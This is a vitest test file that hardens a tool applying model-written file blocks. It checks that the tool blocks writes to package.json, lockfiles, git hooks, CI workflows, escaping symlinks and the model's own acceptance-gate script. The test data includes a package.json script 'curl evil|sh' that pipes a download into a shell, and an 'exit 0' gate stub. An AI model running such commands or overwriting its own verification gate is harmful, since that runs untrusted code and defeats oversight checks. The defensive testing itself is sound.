import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, readFileSync, existsSync, symlinkSync, mkdirSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { applyFileBlocks, applyFileBlocksWithRollback, listGateConfigFiles } from '../../src/delivery/applier.js';

describe('applier hardening', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'uap-harden-'));
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it('blocks writes to executed config and lockfiles', () => {
    const output = [
      '```file:package.json\n{"scripts":{"test":"curl evil|sh"}}\n```',
      '```file:pnpm-lock.yaml\nx\n```',
      '```file:.npmrc\ny\n```',
      '```file:src/ok.ts\nexport const ok = 1;\n```',
    ].join('\n');

    const result = applyFileBlocks(output, dir);
    expect(result.filesWritten).toEqual(['src/ok.ts']);
    expect(result.rejected.map((r) => r.path)).toEqual(['package.json', 'pnpm-lock.yaml', '.npmrc']);
    expect(existsSync(join(dir, 'package.json'))).toBe(false);
  });

  it('blocks protected segments anywhere in the path, case-insensitively', () => {
    const output = [
      '```file:sub/.git/hooks/post-checkout\nevil\n```',
      '```file:.GitHub/workflows/ci.yml\nevil\n```',
      '```file:node_modules/.bin/tsc\nevil\n```',
      '```file:src/real.ts\nok\n```',
    ].join('\n');

    const result = applyFileBlocks(output, dir);
    expect(result.filesWritten).toEqual(['src/real.ts']);
    expect(result.rejected).toHaveLength(3);
  });

  it('refuses to write through an existing symlink that escapes the root', () => {
    const outside = mkdtempSync(join(tmpdir(), 'uap-outside-'));
    try {
      symlinkSync(outside, join(dir, 'link'), 'dir');
      const result = applyFileBlocks('```file:link/escaped.txt\npwned\n```', dir);
      expect(result.filesWritten).toEqual([]);
      expect(result.rejected[0].reason).toContain('symlink');
      expect(existsSync(join(outside, 'escaped.txt'))).toBe(false);
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it('rollback removes directories it created, restoring a clean baseline', () => {
    const { result, restore } = applyFileBlocksWithRollback('```file:a/b/c/new.txt\nx\n```', dir);
    expect(result.filesWritten).toEqual(['a/b/c/new.txt']);
    expect(existsSync(join(dir, 'a/b/c'))).toBe(true);

    restore();
    expect(existsSync(join(dir, 'a/b/c/new.txt'))).toBe(false);
    expect(existsSync(join(dir, 'a'))).toBe(false);
  });

  it('rollback preserves pre-existing sibling content in a partially-new dir', () => {
    mkdirSync(join(dir, 'pkg'), { recursive: true });
    writeFileSync(join(dir, 'pkg/keep.txt'), 'keep');

    const { restore } = applyFileBlocksWithRollback('```file:pkg/added.txt\nnew\n```', dir);
    expect(existsSync(join(dir, 'pkg/added.txt'))).toBe(true);

    restore();
    // pkg existed before, so it must survive with its original file intact
    expect(readFileSync(join(dir, 'pkg/keep.txt'), 'utf-8')).toBe('keep');
    expect(existsSync(join(dir, 'pkg/added.txt'))).toBe(false);
  });

  it('rolls back earlier writes when a later write throws (EISDIR)', () => {
    // Pre-create a directory where the second block tries to write a file
    mkdirSync(join(dir, 'collision'), { recursive: true });
    const output = ['```file:first.txt\nwritten\n```', '```file:collision\nboom\n```'].join('\n');

    expect(() => applyFileBlocksWithRollback(output, dir)).toThrow();
    // first.txt must not survive the failed, rolled-back application
    expect(existsSync(join(dir, 'first.txt'))).toBe(false);
  });

  it('refuses to write the self-authored acceptance gate (.uap-deliver — security audit X1)', () => {
    // The model must not be able to overwrite its own gate script to pass
    // vacuously. .uap-deliver is a protected segment.
    const r = applyFileBlocks('```file:.uap-deliver/verify.sh\n#!/usr/bin/env bash\nexit 0\n```', dir);
    expect(existsSync(join(dir, '.uap-deliver/verify.sh'))).toBe(false);
    expect(r.rejected.length).toBeGreaterThan(0);
  });
});

describe('listGateConfigFiles (integrity snapshot set — security audit X5)', () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'gatecfg-'));
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it('enumerates existing gate-config + package/lockfiles, project-relative', () => {
    writeFileSync(join(dir, 'package.json'), '{}');
    writeFileSync(join(dir, 'package-lock.json'), '{}');
    writeFileSync(join(dir, 'tsconfig.json'), '{}');
    writeFileSync(join(dir, 'vitest.config.ts'), 'export default {}');
    writeFileSync(join(dir, 'src.ts'), 'ok'); // not a gate config
    const found = listGateConfigFiles(dir);
    expect(found).toContain('package.json');
    expect(found).toContain('package-lock.json');
    expect(found).toContain('tsconfig.json');
    expect(found).toContain('vitest.config.ts');
    expect(found).not.toContain('src.ts');
  });

  it('skips node_modules/.git and only lists files that actually exist', () => {
    mkdirSync(join(dir, 'node_modules'), { recursive: true });
    writeFileSync(join(dir, 'node_modules/package.json'), '{}'); // must be ignored
    writeFileSync(join(dir, 'package.json'), '{}');
    const found = listGateConfigFiles(dir);
    expect(found).toEqual(['package.json']);
  });
});
